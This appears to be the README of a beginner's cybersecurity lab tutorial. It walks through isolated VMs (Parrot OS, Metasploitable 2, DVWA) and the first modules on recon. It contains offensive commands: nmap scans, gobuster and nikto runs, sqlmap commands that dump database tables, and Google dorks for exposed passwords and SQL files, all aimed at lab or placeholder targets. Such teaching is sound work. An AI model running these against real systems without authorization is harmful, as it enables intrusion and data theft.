# Zero2Hunter 🎯
> *A beginner's hands-on journey from zero knowledge to Bug Bounty Hunter — built in public.*

![Status](https://img.shields.io/badge/Status-In%20Progress-yellow)
![Level](https://img.shields.io/badge/Level-Beginner-green)
![Cost](https://img.shields.io/badge/Cost-%240-brightgreen)
![Path](https://img.shields.io/badge/Path-Bug%20Bounty%20Hunter-red)

---

## 📖 About This Project

**Zero2Hunter** is a fully documented, hands-on cybersecurity home lab built from the ground up by a beginner IT student with a passion for ethical hacking and bug bounty hunting. Every module is written as a step-by-step tutorial and ends with a practical, real-world lab exercise.

This project is:
- ✅ **100% free** — every tool and resource used costs $0
- ✅ **Beginner-friendly** — no prior hands-on experience required
- ✅ **Portfolio-ready** — structured to impress potential employers
- ✅ **Built in public** — documented openly on GitHub as it is built

> **Career Path:** Bug Bounty Hunter → Penetration Tester → Red Team Operator

> **Tool Note:** This lab uses [Caido](https://caido.io) as its web proxy tool. Burp Suite is widely considered the industry standard and is referenced in most external courses and certifications. The deliberate choice to document Caido here reflects its growing adoption in the bug bounty community, its superior free-tier capabilities, and its lighter resource footprint — all of which make it a strong fit for this lab's goals and hardware constraints.

---

## 🖥️ Lab Hardware Specs

| Component | Spec |
|---|---|
| **Machine** | Dell Inspiron 17R 7720 |
| **CPU** | Intel Core i7-3630QM (4 cores / 8 threads) |
| **RAM** | 8GB (upgrading to 16GB) |
| **Storage** | Drive 1: 1TB HDD (Host OS + Tools) / Drive 2: 1TB HDD (Z:\ — VM Storage) |
| **GPU** | Nvidia GeForce GT 650M |
| **Host OS** | Windows 10 (Phase 1) → Parrot OS Security Edition (Phase 2) |
| **Hypervisor** | VMware Workstation Pro 25H2u1 |

> 💡 **Note:** This lab is intentionally built on modest, older hardware to prove that you don't need an expensive machine to learn cybersecurity. If it runs here, it runs anywhere.

---

## 🗺️ Roadmap

```
PHASE 1 — Build the Foundation
├── Module 00: Prerequisites & Environment Setup      ← Start Here
├── Module 01: Your Attacker Machine (Parrot OS Security)
├── Module 02: Your Target Lab
└── Module 03: Virtual Network Architecture

PHASE 2 — Learn the Skills
├── Module 04: Your Hacker Toolkit
├── Module 05: Recon & OSINT
├── Module 06: Web Application Fundamentals
└── Module 07: OWASP Top 10 Vulnerabilities

PHASE 3 — Hunt for Real
├── Module 08: Bug Bounty Hunting in the Wild
└── Module 09: Documentation & Portfolio Building
```

---

## 📁 Lab Architecture Overview

```
[Drive 1 — 1TB (C:\)]               [Drive 2 — 1TB (Z:\)]
┌─────────────────────┐            ┌─────────────────────┐
│  Host OS (Win 10)   │            │  Virtual Machines   │
│  VMware 25H2u1      │            │                     │
│  Obsidian Notes     │            │  ├── Parrot OS      │
│  Tools & Scripts    │            │  ├── Metasploitable │
│  GitHub Repo        │            │  └── DVWA           │
└─────────────────────┘            └─────────────────────┘
           │                                  │
           └────────── VMware VMnet1 ─────────┘
                    [Isolated Lab Network]
                      192.168.56.0/24
```

---

## 📚 How To Use This Guide

1. **Follow modules in order** — each one builds on the last
2. **Do not skip the labs** — reading without doing creates passive knowledge, not real skill
3. **Document everything** in Obsidian as you go — your notes are future you's best friend
4. **Commit your progress** to GitHub after every module
5. **Break things on purpose** — if something goes wrong, troubleshoot before looking up the answer

> ⚠️ **Legal Reminder:** All hacking in this lab is performed on intentionally vulnerable machines in an isolated network environment. Never attack systems you do not own or have explicit written permission to test.

---

---

# MODULE 00: Prerequisites & Environment Setup 🛠️

**Goal:** Prepare your machine, drives, software, and GitHub repository before touching a single VM.

**Time Estimate:** 1–2 hours

**What You'll Need:**
- Your Dell Inspiron with VMware Workstation Pro 25H2u1 installed ✅
- Drive 2 formatted as NTFS and verified at Z:\ ✅
- Internet connection (downloads are large — be patient)
- A GitHub account ✅
- A quiet place to work

---

### Step 1: Plan Your Drive Allocation

Your two physical 1TB drives are a major advantage. Here is exactly how to use them:

**Drive 1 (C:\ — Your OS drive):**
- Hosts: Windows 10, VMware Workstation Pro, Obsidian, all downloaded files
- Keep at least 200GB free for tools and downloads

**Drive 2 (Z:\ — VM-Storage):**
- Dedicate this ENTIRELY to virtual machine storage
- No other files should live here — VMs need clean, unshared disk I/O

> ✅ With this layout, your VMs run off a completely separate physical drive from your host OS, reducing bottlenecks and keeping your lab organized. VMware will be configured to point to Z:\ in Step 4.

---

### Step 2: Install Obsidian (Your Note-Taking Vault)

Obsidian is a free, local markdown note-taking app that will run side-by-side with your lab at all times. This is where you document commands, findings, errors, and lessons learned.

**Download:** https://obsidian.md (100% free)

**Setup after install:**
1. Create a new vault called `Zero2Hunter`
2. Create the following folders inside your vault:
   ```
   Zero2Hunter Vault/
   ├── 00-Setup/
   ├── 01-Parrot-Setup/
   ├── 02-Target-Lab/
   ├── 03-Networking/
   ├── 04-Toolkit/
   ├── 05-Recon/
   ├── 06-Web-Fundamentals/
   ├── 07-OWASP-Top10/
   ├── 08-Bug-Bounty/
   ├── 09-Portfolio/
   └── Templates/
   ```
3. In `Templates/`, create a file called `Lab-Note-Template.md` with this content:

```markdown
# Lab: [Lab Name]
**Date:**
**Module:**
**Objective:**

---

## Commands Used
# paste commands here

## What Happened
[Describe what you observed]

## What Broke & How I Fixed It
[Document every error and solution]

## Key Takeaways
-

## Questions For Later
-
```

> 💡 **Pro Tip:** Use Obsidian in a snapped window on one side of your screen and your VM on the other. Document as you go — not after.

---

### Step 3: Set Up Your GitHub Repository

1. Log into your GitHub account
2. Create a new repository called `Zero2Hunter`
3. Set it to **Public**
4. Check **"Add a README file"**
5. Choose **"Add .gitignore"** → select `Python` as the template
6. Click **Create repository**

**Then set up Git on your Windows 10 machine:**
- Download Git for Windows: https://git-scm.com/download/win (free)
- Install with default settings
- Open Git Bash and run:

```bash
git config --global user.name "Your GitHub Username"
git config --global user.email "your@email.com"
```

**Clone your repo locally:**
```bash
git clone https://github.com/YOURUSERNAME/Zero2Hunter.git
cd Zero2Hunter
```

> ✅ This is where all your documentation, scripts, and lab notes will live and be published from.

---

### Step 4: Configure VMware Workstation Pro 25H2u1

Before creating any VMs, apply these global settings in VMware:

**Set Default VM Storage Location to Drive 2:**
1. Open VMware Workstation Pro
2. Go to `Edit` → `Preferences` → `Workspace`
3. Under **Default location for virtual machines**, click `Browse`
4. Navigate to `Z:\` and create a folder called `VMs`
5. Set the path to `Z:\VMs`
6. Click `OK`

> ✅ Every VM you create from this point will automatically store its files on Drive 2 at Z:\VMs.

**Configure the Isolated Lab Network:**
1. Go to `Edit` → `Virtual Network Editor`
2. Click `Change Settings` (requires admin rights)
3. Select **VMnet1 (Host-only)**
4. Set Subnet IP to `192.168.56.0`
5. Set Subnet Mask to `255.255.255.0`
6. Uncheck **Use local DHCP service** for now
7. Click `Apply` then `OK`

> ✅ VMnet1 is now your isolated lab network. No traffic on this network can reach the internet.

---

### Step 5: Plan Your RAM Budget

With 8GB of RAM, you must be strategic. Here is your allocation plan:

| Component | RAM Allocation |
|---|---|
| Windows 10 Host OS | ~2GB (minimum to stay stable) |
| Parrot OS VM | 2GB |
| One Target VM at a time | 1GB |
| **Total in use** | **~5GB** |
| **Buffer remaining** | **~3GB** |

> ⚠️ **Rule:** Never run more than 2 VMs simultaneously with 8GB RAM. When you upgrade to 16GB, you can comfortably run 3–4 at once.

---

## 🔬 LAB 00: Verify Your Environment

**Objective:** Confirm every prerequisite is in place before moving to Module 01.

**Complete this checklist. Do not proceed until every box is checked.**

```
ENVIRONMENT CHECKLIST
─────────────────────────────────────────────
[ ] VMware default VM location set to Z:\VMs
[ ] VMnet1 configured at 192.168.56.0/24
[ ] Obsidian installed and Zero2Hunter vault created
[ ] All 10 folders exist inside the Obsidian vault
[ ] Lab-Note-Template.md created in Templates/
[ ] Git installed and configured with username/email
[ ] Zero2Hunter GitHub repository created (Public)
[ ] Repository cloned locally to C:\
[ ] Drive 2 (Z:\) confirmed with at least 500GB free
[ ] Drive 1 (C:\) confirmed with at least 100GB free
─────────────────────────────────────────────
```

**Lab Deliverable — Commit to GitHub:**
1. Open your local `Zero2Hunter` folder
2. Replace the default README with this project's content
3. Create a folder called `progress/`
4. Inside it, create `module-00-complete.md` and write 3–5 sentences about what you set up and what you learned
5. Run:
```bash
git add .
git commit -m "Module 00 complete - environment setup done"
git push origin main
```

> 🏁 **Module 00 Complete.** Your foundation is set. Time to build your attacker machine.

---

---

# MODULE 01: Your Attacker Machine (Parrot OS Security) 🦜

**Goal:** Download, install, and configure a Parrot OS Security Edition virtual machine — your primary hacking platform.

**Time Estimate:** 2–4 hours (mostly download time)

**Why Parrot OS Security Edition?**
Parrot OS Security Edition is a Debian-based operating system purpose-built for penetration testing, digital forensics, and bug bounty hunting. It ships with the same core security toolkit as Kali Linux but is significantly lighter on system resources — making it the smarter choice for older hardware like the Dell Inspiron 17R 7720. It is also the same OS planned for use as the full host OS in Phase 2, meaning everything learned here carries forward with zero relearning.

---

### Step 1: Download Parrot OS Security Edition

- Go to: https://parrotsec.org/download/
- Select **Security Edition**
- Select the **VMware** image (`.ova` or `.vmx` format)

> ⏳ This will take time on a slower connection. While it downloads, open Obsidian, navigate to `01-Parrot-Setup/`, create a new note using your template, and document what Parrot OS Security Edition is and why you chose it. Use the time productively.

> ⚠️ **Only download from parrotsec.org** — never from third-party sites. Always verify the SHA256 checksum after downloading.

**Verify your download (in Windows Command Prompt):**
```cmd
certutil -hashfile parrot-security-[version]-amd64.ova SHA256
```
Compare the output to the hash listed on the Parrot website. They must match exactly.

---

### Step 2: Import Parrot OS into VMware

1. Open VMware Workstation Pro
2. Go to `File` → `Open`
3. Browse to your downloaded Parrot OS file and select it
4. VMware will begin the import process
5. **When prompted to retry or cancel if an import error appears** — click `Retry`. VMware sometimes flags OVA files from other platforms but imports them successfully on retry.
6. **Before powering on — adjust these settings:**
   - Select the imported VM → click `Edit virtual machine settings`
   - **Memory:** `2048 MB` (2GB)
   - **Processors:** `2`
   - **Hard Disk:** Confirm it is stored on `Z:\VMs`
   - **Network Adapter 1:** `NAT` (internet access)
   - **Add Network Adapter 2:** `Host-only (VMnet1)` (isolated lab traffic)
7. Click `OK`

---

### Step 3: First Boot & Initial Configuration

1. Power on `Parrot-Attacker`
2. Check the Parrot OS download page for current default credentials — these are listed alongside the VMware image at parrotsec.org and can change between releases
3. Once logged in, open a Terminal

**Update Parrot OS — always do this first:**
```bash
sudo apt update && sudo apt upgrade -y
```
> ⏳ Allow 15–30 minutes on first run. Do not interrupt it.

**Change your default password immediately:**
```bash
passwd
```
Set a strong password and keep it somewhere safe.

**Install VMware Tools (improves display, clipboard, and performance):**
```bash
sudo apt install -y open-vm-tools open-vm-tools-desktop
reboot
```

**Confirm both network adapters are active:**
```bash
ip a
```
You should see:
- `eth0` — NAT adapter (internet access)
- `eth1` — Host-only adapter (lab network)

**Assign a static IP to your lab adapter:**
```bash
sudo nano /etc/network/interfaces
```
Add these lines:
```
auto eth1
iface eth1 inet static
    address 192.168.56.10
    netmask 255.255.255.0
```
Save with `Ctrl+X` → `Y` → `Enter`, then:
```bash
sudo systemctl restart networking
ip a show eth1
```
You should see `192.168.56.10` confirmed.

---

### Step 4: Install Caido (Your Web Proxy)

Caido is your primary web application analysis tool throughout this lab — a modern, actively developed proxy with a capable free tier and a cleaner interface than legacy alternatives.

**Download Caido for Linux:**
- Go to: https://caido.io/download
- Download the `.deb` package for Linux

**Install:**
```bash
cd ~/Downloads
sudo dpkg -i caido-[version]-amd64.deb
```

**Launch Caido:**
Caido runs as a local web interface. Open your browser and navigate to:
```
http://127.0.0.1:7070
```
Create a free account when prompted.

**Confirm the proxy listener is active:**
Caido → `Settings` → `Listeners` → confirm `127.0.0.1:8080` is running.

**Configure Firefox to route through Caido:**
1. Firefox → `Preferences` → `Network Settings` → `Manual proxy configuration`
2. HTTP Proxy: `127.0.0.1` Port: `8080`
3. Check: `Use this proxy server for all protocols`
4. Click `OK`

**Install Caido's CA Certificate (for HTTPS interception):**
1. In Firefox navigate to `http://127.0.0.1:8080`
2. Download the CA certificate from Caido's proxy page
3. Firefox → `Preferences` → `Privacy & Security` → `View Certificates` → `Import`
4. Select the downloaded certificate, check both trust boxes → `OK`

> ✅ Caido is now intercepting all browser traffic. Every request will appear in the Caido interface as you browse.

**Key Caido features:**
| Feature | Purpose |
|---|---|
| **Proxy → Intercept** | Pause and inspect every request before it reaches the server |
| **Replay** | Resend and modify requests manually — your most-used testing tool |
| **Automate** | Automated parameter fuzzing with wordlists |
| **Search** | Find strings across all captured traffic history |
| **Scope** | Define which targets Caido captures traffic for |

**Caido to Burp Suite translation guide:**
Since most external tutorials reference Burp Suite, use this when following outside resources:

| Burp Suite | Caido Equivalent |
|---|---|
| Repeater | Replay |
| Intruder | Automate |
| Decoder | CyberChef (cyberchef.org — free) |
| Proxy Intercept | Proxy Intercept |

---

### Step 5: Take Your First Snapshot

Before doing anything else with this VM, save its current clean state.

1. In VMware, right-click `Parrot-Attacker`
2. Select `Snapshot` → `Take Snapshot`
3. **Name:** `Clean Install - [Date]`
4. **Description:** `Fresh Parrot OS install with Caido — before any lab work`
5. Click `Take Snapshot`

> ✅ **Rule:** Snapshot before every module's lab. Restore and reset whenever needed. Never fear destroying your environment.

---

### Step 6: Essential Parrot OS Terminal Commands

Practice these daily until they are second nature.

```bash
# Navigation
pwd                    # Where am I right now?
ls -la                 # List all files including hidden ones
cd /path/to/folder     # Change directory
cd ..                  # Go up one level
cd ~                   # Go to home directory

# File Operations
cp file.txt backup.txt       # Copy a file
mv file.txt /tmp/            # Move a file
rm file.txt                  # Delete a file
mkdir foldername             # Create a folder
cat file.txt                 # Display file contents
nano file.txt                # Edit a file in the terminal

# System & Network
whoami                 # What user am I?
sudo su                # Switch to root
ip a                   # Show all network interfaces and IPs
ping 192.168.56.1      # Test connectivity to an IP
netstat -tulpn         # Show open ports and listening services
uname -a               # Show OS and kernel version

# Package Management
sudo apt update                    # Refresh package list
sudo apt install [toolname] -y     # Install a tool
sudo apt remove [toolname]         # Remove a tool
```

---

## 🔬 LAB 01: Your First Recon Mission

**Objective:** Use Parrot OS to orient yourself in your lab environment. Practice terminal navigation with purpose.

**Scenario:** You have just landed on an attacker machine in an unknown environment. Before doing anything else, standard operating procedure is to understand who you are, where you are, and what is around you.

**Task 1 — Orient yourself:**
```bash
whoami
hostname
ip a
```
Document: your username, hostname, and both IP addresses assigned to your VM.

**Task 2 — Identify your OS:**
```bash
uname -a
cat /etc/os-release
```
Document: the exact Parrot OS version you are running.

**Task 3 — Scan your lab network:**
```bash
sudo nmap -sn 192.168.56.0/24
```
Document: which hosts respond. Right now you will see Parrot at `.10` and the VMware host adapter at `.1`.

**Task 4 — Verify Caido is intercepting:**
1. Confirm Firefox is proxied through `127.0.0.1:8080`
2. Navigate to any HTTP website
3. Open Caido at `http://127.0.0.1:7070`
4. Confirm the request appears in the proxy log
5. Screenshot this as your first proof of concept

**Task 5 — Explore your pre-installed tools:**
```bash
ls /usr/share/wordlists/
which nmap sqlmap gobuster nikto
```
Document: which tools are available and what each one is used for.

**Lab Deliverable — Obsidian + GitHub:**
In Obsidian → `01-Parrot-Setup/` → create `lab-01-first-recon.md`
Answer in writing: *"Why do you orient yourself on a machine before taking any action against targets?"*

```bash
git add .
git commit -m "Module 01 complete - Parrot OS attacker machine built"
git push origin main
```

> 🏁 **Module 01 Complete.** Your weapon is loaded. Now let's build your targets.

---

---

# MODULE 02: Your Target Lab 🎯

**Goal:** Set up intentionally vulnerable virtual machines that you will legally attack throughout this lab.

**Time Estimate:** 2–3 hours

---

### What Are Vulnerable VMs?

Vulnerable VMs are machines deliberately built with security flaws for legal, ethical practice. Attacking them is 100% legal because you own them and they run entirely inside your isolated private network.

| VM | Purpose |
|---|---|
| **Metasploitable 2** | A deliberately vulnerable Linux server — your first network attack target |
| **DVWA** | A vulnerable PHP/MySQL web application — your primary web hacking target |

---

### Step 1: Download Metasploitable 2

- Go to: https://sourceforge.net/projects/metasploitable/
- Download `Metasploitable2-Linux.zip` (~900MB)
- Extract the ZIP file to `Z:\VMs\Metasploitable2`

**Import into VMware:**
1. Open VMware Workstation Pro
2. `File` → `Open`
3. Browse to the extracted folder and select the `.vmx` file
4. If VMware asks whether the VM was moved or copied — select **"I copied it"**
5. Configure VM settings:
   - **Memory:** `512 MB`
   - **Network Adapter:** `Host-only (VMnet1)` **ONLY**
   > ⚠️ **CRITICAL:** Metasploitable must NEVER have NAT or internet access. Host-only only.
6. Power on the VM
7. Login: **Username:** `msfadmin` / **Password:** `msfadmin`
8. Find its IP:
```bash
ifconfig
```
It will be in the `192.168.56.x` range. Write this IP down — you will use it constantly.

---

### Step 2: Access DVWA via Metasploitable

Metasploitable 2 ships with DVWA pre-installed. This saves you an entire VM's worth of RAM — a meaningful advantage on 8GB.

From Firefox in Parrot, navigate to:
```
http://[Metasploitable-IP]/dvwa
```
Login: `admin` / `password`

**After logging in:**
1. Click `DVWA Security` in the left menu
2. Set security level to `Low`
3. Click `Submit`

This is your primary web attack target for Modules 06 and 07.

---

### Step 3: Snapshot Every Target VM

Before attacking anything, snapshot every VM in its clean state.

**For Metasploitable:**
1. Right-click the VM in VMware → `Snapshot` → `Take Snapshot`
2. **Name:** `Clean Install - [Date]`
3. **Description:** `Fresh Metasploitable 2 — before any exploitation`

> ✅ Restore to this snapshot any time you want a clean target to practice against.

---

## 🔬 LAB 02: Map Your Lab Network

**Objective:** Discover and document every machine on your lab network before touching any of them offensively.

**Scenario:** A bug bounty program has given you a private network range: `192.168.56.0/24`. Identify every live host and map their exposed services before any exploitation begins.

**Task 1 — Discover all live hosts:**
```bash
sudo nmap -sn 192.168.56.0/24
```
Document every IP that responds.

**Task 2 — Scan Metasploitable for open ports and services:**
```bash
sudo nmap -sV -O 192.168.56.[METASPLOITABLE-IP]
```
Document: every open port, service name, and version number.

**Task 3 — Access DVWA from Parrot's browser:**
1. Open Firefox in Parrot
2. Navigate to `http://192.168.56.[METASPLOITABLE-IP]/dvwa`
3. Login with `admin` / `password`
4. Confirm security level is set to `Low`
5. Screenshot the DVWA dashboard

**Task 4 — Build your target profile:**
In Obsidian → `02-Target-Lab/` → create `target-profile.md`:

```markdown
# Target Profile: Lab Network

## Network Range
192.168.56.0/24

## Host 1: Metasploitable 2
- **IP:**
- **OS:**
- **Open Ports:**
  | Port | Service | Version |
  |------|---------|---------|

## Host 2: DVWA (via Metasploitable)
- **URL:** http://[IP]/dvwa
- **Login:** admin / password
- **Security Level:** Low
```

**Lab Deliverable:**
```bash
git add .
git commit -m "Module 02 complete - target lab deployed and mapped"
git push origin main
```

> 🏁 **Module 02 Complete.** You have an attacker and targets. Let's wire the network properly.

---

---

# MODULE 03: Virtual Network Architecture 🌐

**Goal:** Understand and verify your isolated lab network. Ensure all attack traffic stays completely contained inside your lab.

**Time Estimate:** 1 hour

---

### Understanding VMware Network Modes

| Mode | Internet Access | Reach Host | Reach Other VMs | Use Case |
|---|---|---|---|---|
| **NAT (VMnet8)** | ✅ Yes | ❌ No | ❌ No | Parrot internet access |
| **Host-only (VMnet1)** | ❌ No | ✅ Yes | ✅ Yes | Isolated lab traffic |
| **Bridged** | ✅ Yes | ✅ Yes | ✅ Yes | ⚠️ Never use for targets |

**Your lab configuration:**
- **Parrot OS:** NAT + Host-only — can reach the internet AND the lab network
- **All target VMs:** Host-only ONLY — completely isolated from the internet

---

### Step 1: Verify Network Isolation

Start all VMs, then run these tests from Parrot:

```bash
# Can Parrot reach the internet? (should succeed)
ping 8.8.8.8 -c 3

# Can Parrot reach Metasploitable? (should succeed)
ping 192.168.56.[METASPLOITABLE-IP] -c 3

# SSH into Metasploitable to test its internet access
ssh msfadmin@192.168.56.[METASPLOITABLE-IP]

# From inside Metasploitable — can it reach the internet?
ping 8.8.8.8 -c 3
# Expected: 100% packet loss — this is CORRECT
```

> ✅ If Metasploitable cannot reach the internet, your isolation is working exactly as designed.

---

### Your Final Lab Network Diagram

```
INTERNET
    │
    │ (NAT - VMnet8)
    │
┌────────────────────────┐
│   Parrot OS Security   │  192.168.56.10 (Host-only VMnet1)
│   192.168.56.10        │──────────────────────────────────┐
└────────────────────────┘                                  │
                                                    [VMnet1]
                                               192.168.56.0/24
                                                        │
                               ┌────────────────────────┼──────────────────┐
                               │                         │                  │
                    ┌──────────────────┐    ┌──────────────────┐     [future VMs]
                    │ Metasploitable 2 │    │       DVWA       │
                    │  192.168.56.x    │    │  (via Metaspl.)  │
                    └──────────────────┘    └──────────────────┘
                      (NO internet)            (NO internet)
```

---

## 🔬 LAB 03: Network Isolation Verification

**Objective:** Prove your lab network is properly isolated and document the verified architecture.

**Task 1:** Run all isolation tests from Step 1 and document every result.

**Task 2:** Confirm your full host inventory:
```bash
sudo nmap -sn 192.168.56.0/24
```
Expected: `.1` (VMware host adapter), `.10` (Parrot), `.x` (Metasploitable)

**Task 3:** In Obsidian → `03-Networking/` → create `network-diagram.md`
Recreate the diagram above with your actual IP addresses filled in.

**Task 4:** Answer in writing: *"Why is it dangerous to give a vulnerable VM like Metasploitable a bridged network connection that puts it directly on your home network?"*

**Lab Deliverable:**
```bash
git add .
git commit -m "Module 03 complete - isolated lab network verified and documented"
git push origin main
```

> 🏁 **Module 03 Complete.** Phase 1 is done. Your lab is built, isolated, and documented. Time to learn the skills.

---

---

# MODULE 04: Your Hacker Toolkit 🔧

**Goal:** Learn the core tools used in bug bounty hunting. Understand what each tool does, when to use it, and how to use it responsibly.

**Time Estimate:** 3–4 hours

---

### Your Core Bug Bounty Toolkit

All tools below except Caido are pre-installed in Parrot OS Security Edition. Everything is free.

| Tool | Category | Purpose |
|---|---|---|
| **Nmap** | Recon | Network scanning, port and service discovery |
| **Caido** | Web Proxy | Intercept, inspect, and modify HTTP/HTTPS traffic |
| **Gobuster** | Web | Directory and file brute-forcing |
| **Nikto** | Web | Web server vulnerability scanner |
| **SQLMap** | Exploitation | Automated SQL injection detection and exploitation |
| **theHarvester** | OSINT | Email, subdomain, and host discovery from public sources |
| **Hydra** | Auth Testing | Password brute-force attacks |
| **Metasploit** | Exploitation | Full-featured exploitation framework |

---

### Tool 1: Nmap

The most important recon tool in existence. Used to discover live hosts, open ports, running services, and operating systems.

```bash
# Ping sweep — find all live hosts
nmap -sn 192.168.56.0/24

# Basic TCP port scan
nmap 192.168.56.[TARGET]

# Service and version detection
nmap -sV 192.168.56.[TARGET]

# OS detection (requires root)
sudo nmap -O 192.168.56.[TARGET]

# Full aggressive scan — thorough but slow
sudo nmap -A -p- 192.168.56.[TARGET]

# Scan specific ports only
nmap -p 22,80,443,3306 192.168.56.[TARGET]

# Save scan results to file
sudo nmap -sV -oN scan-results.txt 192.168.56.[TARGET]
```

---

### Tool 2: Caido

Caido intercepts all traffic between your browser and your target, giving you full visibility and control over every HTTP and HTTPS request.

**Core Caido Workflow:**

**Proxy — Intercepting and Inspecting Traffic:**
1. Enable `Intercept` in Caido's Proxy section
2. Every request Firefox sends will now pause for your review
3. Read the full request — method, URL, headers, cookies, body
4. Modify any value you choose before forwarding
5. Click `Forward` to send to the server or `Drop` to cancel

**Replay — Your Primary Testing Tool:**
```
1. Find any request in Caido's proxy history
2. Right-click → Send to Replay
3. Modify one parameter at a time
4. Send and observe the response
5. Change it again — keep probing methodically
6. Document every response that differs from baseline
```
This one-variable-at-a-time approach finds vulnerabilities that automated scanners miss entirely.

**Automate — Fuzzing Parameters:**
1. Send a request to Automate
2. Highlight the value you want to fuzz
3. Load a wordlist
4. Run and analyze response differences — look for length changes, status codes, error messages

**Search — Pattern Discovery Across All Traffic:**
Search your entire captured history at once. Look for:
- `password` — credentials in plaintext
- `token` — API keys or CSRF tokens
- `error` — stack traces revealing server internals
- `admin` — privileged endpoints

---

### Tool 3: Gobuster

Gobuster discovers hidden directories and files by brute-forcing paths with wordlists.

```bash
# Directory brute-force
gobuster dir -u http://192.168.56.[TARGET] \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Search for specific file extensions
gobuster dir -u http://192.168.56.[TARGET] \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak

# Subdomain discovery
gobuster dns -d target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

### Tool 4: Nikto

Nikto automatically scans web servers for thousands of known vulnerabilities and misconfigurations.

```bash
# Basic scan
nikto -h http://192.168.56.[TARGET]

# Scan a specific port
nikto -h http://192.168.56.[TARGET] -p 8080

# Save output
nikto -h http://192.168.56.[TARGET] -o nikto-results.txt
```

> ⚠️ Nikto is loud and will trigger any IDS. Only use it on systems you own.

---

### Tool 5: SQLMap

SQLMap automates the detection and exploitation of SQL injection vulnerabilities.

```bash
# Test a URL for SQL injection
sqlmap -u "http://192.168.56.[TARGET]/page.php?id=1"

# List all databases
sqlmap -u "http://192.168.56.[TARGET]/page.php?id=1" --dbs

# List tables in a database
sqlmap -u "http://192.168.56.[TARGET]/page.php?id=1" -D [dbname] --tables

# Dump a table's contents
sqlmap -u "http://192.168.56.[TARGET]/page.php?id=1" -D [dbname] -T [table] --dump
```

---

### Tool 6: theHarvester

theHarvester gathers publicly available intelligence about a target — emails, subdomains, IPs, and hostnames.

```bash
# Harvest from multiple public sources
theHarvester -d example.com -b google,bing,yahoo,dnsdumpster

# Save results
theHarvester -d example.com -b all -f results.html
```

---

### Install SecLists (Essential Wordlists)

```bash
sudo apt install seclists -y
ls /usr/share/seclists/
```

You now have wordlists for directories, passwords, subdomains, and fuzzing payloads — all free and immediately available.

---

## 🔬 LAB 04: Tool Verification Challenge

**Objective:** Run every core tool against Metasploitable and document your findings. This simulates a complete initial recon phase.

```bash
# Task 1: Full Nmap aggressive scan
sudo nmap -A -p- 192.168.56.[METASPLOITABLE] -oN lab04-nmap.txt

# Task 2: Nikto web scan
nikto -h http://192.168.56.[METASPLOITABLE] -o lab04-nikto.txt

# Task 3: Gobuster directory scan on DVWA
gobuster dir -u http://192.168.56.[METASPLOITABLE]/dvwa \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o lab04-gobuster.txt

# Task 4: Intercept a DVWA login in Caido
# Enable Intercept → submit DVWA login form → capture and screenshot the raw request

# Task 5: Test DVWA for SQL injection with SQLMap
sqlmap -u "http://192.168.56.[METASPLOITABLE]/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=[your-session-id]; security=low" \
  --dbs

# Task 6: theHarvester on a legal public domain
theHarvester -d wikipedia.org -b bing -l 50
```

**Lab Deliverable:**
In Obsidian → `04-Toolkit/` → create `lab-04-tool-recon.md`

Answer in writing:
- *"Which tool gave you the most actionable information and why?"*
- *"What is the difference between active and passive recon tools?"*

```bash
git add .
git commit -m "Module 04 complete - full toolkit verified against live lab targets"
git push origin main
```

> 🏁 **Module 04 Complete.** You know your weapons. Now learn to think like a hunter.

---

---

# MODULE 05: Recon & OSINT 🔍

**Goal:** Master the reconnaissance phase — the most important and most overlooked step in bug bounty hunting.

**Time Estimate:** 2–3 hours

---

### The Recon Mindset

> *"The more you know about your target before you start attacking, the more bugs you will find."*

Most beginners skip deep recon and jump straight to scanning. This is exactly why they find nothing. Experienced hunters spend 60–70% of their time on recon before touching a single exploit.

| Type | Description | Detected? |
|---|---|---|
| **Passive** | Gather info without contacting the target | ❌ No |
| **Active** | Directly probe the target's systems | ✅ Yes |

Always start passive. Always.

---

### Passive Recon Techniques

**1. Google Dorking**
```
site:target.com                        # All indexed pages
site:target.com filetype:pdf           # Exposed PDF documents
site:target.com inurl:admin            # Admin panel pages
site:target.com intext:"password"      # Pages mentioning passwords
intitle:"index of" site:target.com     # Open directory listings
"target.com" ext:sql                   # Exposed SQL files
```

**2. WHOIS Lookup**
```bash
whois target.com
```

**3. DNS Enumeration**
```bash
host target.com
host -t mx target.com
theHarvester -d target.com -b dnsdumpster,bing,google
```

**4. Subdomain Discovery**
```bash
gobuster dns -d target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**5. Certificate Transparency Logs**
- Visit: https://crt.sh
- Search: `%.target.com`
- Reveals every subdomain that has ever had an SSL certificate issued

---

### Active Recon Techniques

**Port Scanning:**
```bash
sudo nmap -sV 192.168.56.[TARGET]          # Top 1000 ports
sudo nmap -p- -sV 192.168.56.[TARGET]      # All 65535 ports
sudo nmap -sU --top-ports 100 192.168.56.[TARGET]  # UDP scan
```

**Web Directory Brute-Forcing:**
```bash
gobuster dir -u http://[TARGET] \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak
```

**Web Technology Fingerprinting:**
```bash
whatweb http://192.168.56.[TARGET]
```

---

### Your Standard Recon Workflow

```
1. PASSIVE FIRST
   └── Google dorks → WHOIS → DNS → Subdomains → Cert transparency

2. SURFACE MAPPING
   └── Port scan → Web fingerprint → Directory brute force

3. SERVICE DEEP DIVE
   └── Version scanning → Service enumeration → Screenshot all web ports

4. DOCUMENT EVERYTHING
   └── Update target profile → Screenshot findings → Commit to GitHub
```

---

## 🔬 LAB 05: Full Recon on Metasploitable

**Objective:** Execute a complete recon workflow and produce a professional recon report.

```bash
# Task 1: Full port and version scan
sudo nmap -sV -p- 192.168.56.[METASPLOITABLE] -oN lab05-fullscan.txt

# Task 2: Web fingerprint
whatweb http://192.168.56.[METASPLOITABLE]

# Task 3: Directory brute force
gobuster dir -u http://192.168.56.[METASPLOITABLE] \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt -o lab05-gobuster.txt

# Task 4: Nikto scan
nikto -h http://192.168.56.[METASPLOITABLE] -o lab05-nikto.txt

# Task 5: UDP scan
sudo nmap -sU --top-ports 20 192.168.56.[METASPLOITABLE]
```

**Deliverable — Recon Report:**
In Obsidian → `05-Recon/` → create `lab05-recon-report.md`

```markdown
